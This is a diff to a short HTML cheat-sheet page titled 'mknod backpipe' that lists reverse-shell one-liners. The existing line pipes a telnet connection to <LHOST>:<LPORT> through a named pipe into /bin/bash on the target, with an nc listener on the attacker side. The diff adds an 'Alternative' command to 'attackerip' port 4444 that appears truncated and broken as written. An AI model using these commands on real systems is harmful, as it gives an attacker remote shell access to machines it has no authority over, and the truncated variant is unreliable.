@@ -2,6 +2,11 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>FIFO Pipe</title>
+<title>mknod backpipe</title>
 </head><body>TARGET: mknod backpipe p &amp;&amp; telnet &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe<br/>
-ATTACKER: nc -n -vv -l -p &lt;LPORT&gt;</body></html>
+ATTACKER: nc -n -vv -l -p &lt;LPORT&gt;<br/>
+<br/>
+<br/>
+Alternative<br/>
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p<br/>
+</body></html>
